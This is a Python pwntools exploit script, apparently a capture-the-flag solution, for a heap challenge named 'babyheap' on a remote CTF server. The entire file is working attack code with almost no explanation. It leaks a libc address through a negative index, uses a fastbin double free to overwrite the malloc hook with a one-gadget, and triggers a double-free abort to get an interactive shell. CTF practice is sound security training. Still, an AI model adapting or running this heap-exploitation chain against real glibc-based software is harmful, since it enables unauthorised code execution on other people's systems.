# exploit_babyheap.py

from pwn import *

# r = process("./babyheap")
r = remote("ctf.j0n9hyun.xyz", 3030)

offset_setvbuf = 0x6fe70 # offset of setvbuf() from libc base
offset_mallochook = 0x3c4b10 # offset of malloc hook from libc base
offset_onegadget = 0xf02a4 # offset of onegadget from libc base

def Malloc(size, content):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("size: ")
    r.sendline(str(size))
    r.recvuntil("content: ")
    r.send(content)

def Free(index):
    r.recvuntil("> ")
    r.sendline("2")
    r.recvuntil("index: ")
    r.sendline(str(index))

def Show(index):
    r.recvuntil("> ")
    r.sendline("3")
    r.recvuntil("index: ")
    r.sendline(str(index))

Show(-262978) # libc leak
addr_setvbuf = u64(r.recv(6).ljust(8, "\x00")) # address of setvbuf()
log.info("address of setvbuf() : " + hex(addr_setvbuf))
addr_libc = addr_setvbuf - offset_setvbuf # address of libc base
log.info("address of libc base : " + hex(addr_libc))
addr_mallochook = addr_libc + offset_mallochook # address of malloc hook
log.info("address of malloc hook : " + hex(addr_mallochook))
addr_onegadget = addr_libc + offset_onegadget # address of one gadget
log.info("address of one gadget : " + hex(addr_onegadget))

Malloc(0x60, "AAAA") # index: 0
Malloc(0x60, "BBBB") # index: 1
Free(0)
Free(1)
Free(0)
Malloc(0x60, p64(addr_mallochook - 0x23)) # index: 2
Malloc(0x60, "AAAA") # index: 3
Malloc(0x60, "BBBB") # index: 4
Malloc(0x60, "A"*0x13 + p64(addr_onegadget)) # index: 5
Free(2)
Free(2) # double free corruption

r.interactive()